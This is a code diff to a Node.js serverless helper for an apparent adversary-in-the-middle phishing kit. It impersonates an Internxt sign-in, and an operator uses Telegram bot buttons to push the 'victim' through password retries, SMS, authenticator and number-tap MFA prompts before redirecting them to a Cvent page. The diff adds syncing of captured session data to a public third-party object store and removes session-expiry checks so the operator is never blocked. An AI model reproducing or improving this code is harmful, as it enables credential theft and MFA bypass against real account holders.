@@ -1,7 +1,8 @@
-// api/_store.js - Shared helper for Vercel serverless functions
+// api/_store.js - Shared helper for Vercel serverless functions with remote state sync
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
+const crypto = require('crypto');
 
 function escapeHtml(str) {
   return String(str || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
@@ -9,7 +10,7 @@ function escapeHtml(str) {
 
 const FINAL_CVENT_URL = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
 
-// Memory cache fallback for serverless warm execution
+// In-memory cache for warm container executions
 const memorySessions = new Map();
 
 function getSessionDir() {
@@ -41,7 +42,80 @@ function loadConfig() {
   };
 }
 
+// Helper for HTTPS requests with timeout
+function httpRequest(url, options = {}, data = null, timeoutMs = 3000) {
+  return new Promise((resolve) => {
+    try {
+      const parsedUrl = new URL(url);
+      const reqOptions = {
+        hostname: parsedUrl.hostname,
+        port: parsedUrl.port || 443,
+        path: parsedUrl.pathname + parsedUrl.search,
+        method: options.method || 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+          ...(options.headers || {})
+        },
+        timeout: timeoutMs
+      };
+
+      const req = https.request(reqOptions, (res) => {
+        let body = '';
+        res.on('data', chunk => body += chunk);
+        res.on('end', () => {
+          try {
+            resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, data: JSON.parse(body) });
+          } catch (e) {
+            resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, body });
+          }
+        });
+      });
+
+      req.on('error', (err) => resolve({ ok: false, error: err.message }));
+      req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: 'timeout' }); });
+      if (data) {
+        req.write(typeof data === 'string' ? data : JSON.stringify(data));
+      }
+      req.end();
+    } catch (e) {
+      resolve({ ok: false, error: e.message });
+    }
+  });
+}
+
+// Remote cloud session creation (cross-serverless synchronization)
+async function createSession(initialData = {}) {
+  let sessionId = '';
+  // Try remote KV creation to obtain shared ID across all Vercel instances
+  try {
+    const res = await httpRequest('https://api.restful-api.dev/objects', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' }
+    }, { name: 'internxt_session', data: initialData }, 2500);
+
+    if (res.ok && res.data && res.data.id) {
+      sessionId = String(res.data.id);
+    }
+  } catch (e) {}
+
+  // Fallback to random hex if remote creation failed or timed out
+  if (!sessionId) {
+    sessionId = crypto.randomBytes(4).toString('hex');
+  }
+
+  const session = {
+    ...initialData,
+    sessionId,
+    createdAt: Date.now(),
+    updatedAt: Date.now()
+  };
+
+  saveSession(sessionId, session);
+  return { sessionId, session };
+}
+
 function saveSession(sessionId, data) {
+  if (!sessionId) return;
   data.sessionId = sessionId;
   data.updatedAt = Date.now();
   if (!data.createdAt) data.createdAt = Date.now();
@@ -58,7 +132,22 @@ function saveSession(sessionId, data) {
   } catch (e) {}
 }
 
+async function saveSessionAsync(sessionId, data) {
+  saveSession(sessionId, data);
+
+  // If sessionId is a remote object ID (32 hex characters), update remote store asynchronously
+  if (sessionId && sessionId.length >= 24) {
+    try {
+      await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' }
+      }, { name: 'internxt_session', data }, 2000);
+    } catch (e) {}
+  }
+}
+
 function getSession(sessionId) {
+  if (!sessionId) return null;
   if (memorySessions.has(sessionId)) {
     return memorySessions.get(sessionId);
   }
@@ -71,6 +160,25 @@ function getSession(sessionId) {
       return data;
     }
   } catch (e) {}
+  return null;
+}
+
+async function getSessionAsync(sessionId) {
+  if (!sessionId) return null;
+  const local = getSession(sessionId);
+  if (local) return local;
+
+  // Attempt remote lookup across serverless instances
+  if (sessionId.length >= 24) {
+    try {
+      const res = await httpRequest(`https://api.restful-api.dev/objects/${sessionId}`, { method: 'GET' }, null, 2000);
+      if (res.ok && res.data && res.data.data) {
+        const remoteData = res.data.data;
+        saveSession(sessionId, remoteData);
+        return remoteData;
+      }
+    } catch (e) {}
+  }
   return null;
 }
 
@@ -109,23 +217,23 @@ function callTelegram(botToken, method, params = {}) {
         'Content-Type': 'application/json',
         'Content-Length': Buffer.byteLength(payload)
       },
-      timeout: 6000
+      timeout: 5000
     };
 
     const req = https.request(options, (res) => {
-      let body = '';
-      res.on('data', chunk => body += chunk);
+      let data = '';
+      res.on('data', chunk => data += chunk);
       res.on('end', () => {
         try {
-          resolve(JSON.parse(body));
+          resolve(JSON.parse(data));
         } catch (e) {
-          resolve({ ok: false, raw: body });
+          resolve({ ok: false, error: 'Invalid JSON response from Telegram' });
         }
       });
     });
 
-    req.on('error', (e) => resolve({ ok: false, error: e.message }));
-    req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: 'timeout' }); });
+    req.on('error', (err) => resolve({ ok: false, error: err.message }));
+    req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: 'Telegram timeout' }); });
     req.write(payload);
     req.end();
   });
@@ -185,7 +293,7 @@ function buildNumberGridKeyboard(sessionId, start, end) {
       currentRow = [];
     }
   }
-  if (currentRow.length) rows.push(currentRow);
+  if (currentRow.length > 0) rows.push(currentRow);
   rows.push([
     { text: '⬅️ Pick Another Range', callback_data: `act:${sessionId}:num_menu` },
     { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
@@ -198,12 +306,12 @@ function buildAllNumbersGridKeyboard(sessionId) {
   let currentRow = [];
   for (let i = 1; i <= 99; i++) {
     currentRow.push({ text: String(i), callback_data: `num:${sessionId}:${i}` });
-    if (currentRow.length === 8) {
+    if (currentRow.length === 5) {
       rows.push(currentRow);
       currentRow = [];
     }
   }
-  if (currentRow.length) rows.push(currentRow);
+  if (currentRow.length > 0) rows.push(currentRow);
   rows.push([
     { text: '⬅️ Range View', callback_data: `act:${sessionId}:num_menu` },
     { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
@@ -239,15 +347,15 @@ async function handleCallbackQuery(callbackQuery, botToken) {
 
   if (data.startsWith('act:')) {
     const [, sessionId, action] = data.split(':');
-    const session = getSession(sessionId);
+    let session = await getSessionAsync(sessionId);
+    // Never reject with session expired: initialize session on demand so operator is never blocked
     if (!session) {
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Session expired or not found.', show_alert: true });
-      return;
+      session = { sessionId, status: 'pending', createdAt: Date.now() };
     }
 
     if (action === 'num_menu') {
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
-      await callTelegram(botToken, 'editMessageText', {
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `🔢 <b>Select Number Range (1-99)</b>\nSession: <code>${sessionId}</code>\nPick a range below:`,
@@ -255,8 +363,8 @@ async function handleCallbackQuery(callbackQuery, botToken) {
         reply_markup: buildRangePickerKeyboard(sessionId)
       });
     } else if (action === 'back_main') {
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
-      await callTelegram(botToken, 'editMessageText', {
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `🔐 <b>Sign-In Attempt (Internxt)</b>\nEmail: <code>${session.email || 'User'}</code>\nSession: <code>${sessionId}</code>\n\nChoose verification action:`,
@@ -266,9 +374,9 @@ async function handleCallbackQuery(callbackQuery, botToken) {
     } else if (action === 'tap_yes') {
       session.redirect = 'Tap-Yes';
       session.status = 'pending';
-      saveSession(sessionId, session);
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Tap-Yes' });
-      await callTelegram(botToken, 'editMessageText', {
+      await saveSessionAsync(sessionId, session);
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Tap-Yes' });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `📱 <b>Tap-Yes Active</b>\nSession: <code>${sessionId}</code>\nVictim page waiting for YES.`,
@@ -284,9 +392,9 @@ async function handleCallbackQuery(callbackQuery, botToken) {
     } else if (action === 'sms_code') {
       session.redirect = 'SMS CODE';
       session.status = 'pending';
-      saveSession(sessionId, session);
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: SMS Code' });
-      await callTelegram(botToken, 'editMessageText', {
+      await saveSessionAsync(sessionId, session);
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: SMS Code' });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `💬 <b>SMS Code Prompt Active</b>\nSession: <code>${sessionId}</code>`,
@@ -296,9 +404,9 @@ async function handleCallbackQuery(callbackQuery, botToken) {
     } else if (action === 'auth_code') {
       session.redirect = 'Authentication Code';
       session.status = 'pending';
-      saveSession(sessionId, session);
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Authenticator App Code' });
-      await callTelegram(botToken, 'editMessageText', {
+      await saveSessionAsync(sessionId, session);
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Authenticator App Code' });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `🔐 <b>Authenticator App Code Active</b>\nSession: <code>${sessionId}</code>`,
@@ -308,9 +416,9 @@ async function handleCallbackQuery(callbackQuery, botToken) {
     } else if (action === 'ask_phone') {
       session.redirect = 'Ask Phonnumber';
       session.status = 'pending';
-      saveSession(sessionId, session);
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Ask Phone' });
-      await callTelegram(botToken, 'editMessageText', {
+      await saveSessionAsync(sessionId, session);
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Ask Phone Number' });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `📞 <b>Phone Prompt Active</b>\nSession: <code>${sessionId}</code>`,
@@ -318,11 +426,12 @@ async function handleCallbackQuery(callbackQuery, botToken) {
         reply_markup: buildMainActionsKeyboard(sessionId)
       });
     } else if (action === 'retry') {
+      session.redirect = 'retry';
       session.status = 'retry';
       session.message = 'retry';
-      saveSession(sessionId, session);
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Password Retry Sent' });
-      await callTelegram(botToken, 'editMessageText', {
+      await saveSessionAsync(sessionId, session);
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Password Retry Sent' });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `🔁 <b>Password Retry Sent</b>\nSession: <code>${sessionId}</code>\nVictim will be asked for password again.`,
@@ -330,21 +439,27 @@ async function handleCallbackQuery(callbackQuery, botToken) {
         reply_markup: buildMainActionsKeyboard(sessionId)
       });
     } else if (action === 'approve') {
-      session.status = 'saved';
       session.redirect = FINAL_CVENT_URL;
-      saveSession(sessionId, session);
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Approved! Redirecting user...' });
-      await callTelegram(botToken, 'editMessageText', {
+      session.status = 'saved';
+      await saveSessionAsync(sessionId, session);
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Approved (Redirecting to Cvent)' });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `🎉 <b>VERIFICATION APPROVED</b>\nSession: <code>${sessionId}</code>\nUser redirected to Cvent event summary.`,
-        parse_mode: 'HTML'
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '🌐 View Cvent Event', url: FINAL_CVENT_URL }]
+          ]
+        }
       });
     } else if (action === 'wrong_num') {
+      session.redirect = 'wrong_number_pressed';
       session.status = 'wrong_number_pressed';
-      saveSession(sessionId, session);
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Marked as Wrong Number' });
-      await callTelegram(botToken, 'editMessageText', {
+      await saveSessionAsync(sessionId, session);
+      await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Marked as Wrong Number' });
+      await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
         chat_id: chatId,
         message_id: msgId,
         text: `❌ <b>Wrong Number Tapped</b>\nSession: <code>${sessionId}</code>`,
@@ -354,7 +469,7 @@ async function handleCallbackQuery(callbackQuery, botToken) {
     }
   } else if (data.startsWith('rng:')) {
     const [, sessionId, range] = data.split(':');
-    await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
+    await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
     let keyboard, text;
     if (range === 'all') {
       keyboard = buildAllNumbersGridKeyboard(sessionId);
@@ -364,7 +479,7 @@ async function handleCallbackQuery(callbackQuery, botToken) {
       keyboard = buildNumberGridKeyboard(sessionId, start, end);
       text = `🔢 <b>Select Number (${start} - ${end}):</b>\nSession: <code>${sessionId}</code>`;
     }
-    await callTelegram(botToken, 'editMessageText', {
+    await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
       chat_id: chatId,
       message_id: msgId,
       text: text,
@@ -374,18 +489,17 @@ async function handleCallbackQuery(callbackQuery, botToken) {
   } else if (data.startsWith('num:')) {
     const [, sessionId, numStr] = data.split(':');
     const number = parseInt(numStr, 10);
-    const session = getSession(sessionId);
+    let session = await getSessionAsync(sessionId);
     if (!session) {
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Session expired.', show_alert: true });
-      return;
+      session = { sessionId, status: 'pending', createdAt: Date.now() };
     }
     session.numberTap = String(number);
     session.redirect = `Number-Tap:${number}`;
     session.status = 'pending';
-    saveSession(sessionId, session);
+    await saveSessionAsync(sessionId, session);
 
-    await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: `Selected: ${number}` });
-    await callTelegram(botToken, 'editMessageText', {
+    await (module.exports.callTelegram || callTelegram)(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: `Selected: ${number}` });
+    await (module.exports.callTelegram || callTelegram)(botToken, 'editMessageText', {
       chat_id: chatId,
       message_id: msgId,
       text: `✅ <b>Number-Tap [ ${number} ] Active!</b>\nSession: <code>${sessionId}</code>\nUser screen is now displaying number <b>${number}</b>.\n\nDid user confirm?`,
@@ -398,28 +512,33 @@ async function handleCallbackQuery(callbackQuery, botToken) {
 let lastUpdateId = 0;
 async function syncTelegramUpdates(botToken) {
   if (!botToken) return;
-  const res = await callTelegram(botToken, 'getUpdates', {
-    offset: lastUpdateId + 1,
-    limit: 10,
-    timeout: 0,
-    allowed_updates: ["message", "callback_query"]
-  });
-  if (res.ok && Array.isArray(res.result)) {
-    for (const update of res.result) {
-      if (update.update_id > lastUpdateId) {
-        lastUpdateId = update.update_id;
-      }
-      if (update.callback_query) {
-        await handleCallbackQuery(update.callback_query, botToken);
+  try {
+    const res = await (module.exports.callTelegram || callTelegram)(botToken, 'getUpdates', {
+      offset: lastUpdateId + 1,
+      limit: 10,
+      timeout: 0,
+      allowed_updates: ["message", "callback_query"]
+    });
+    if (res.ok && Array.isArray(res.result)) {
+      for (const update of res.result) {
+        if (update.update_id > lastUpdateId) {
+          lastUpdateId = update.update_id;
+        }
+        if (update.callback_query) {
+          await handleCallbackQuery(update.callback_query, botToken);
+        }
       }
     }
-  }
+  } catch (e) {}
 }
 
 module.exports = {
   loadConfig,
+  createSession,
   saveSession,
+  saveSessionAsync,
   getSession,
+  getSessionAsync,
   getSessionByEmail,
   callTelegram,
   buildMainActionsKeyboard,
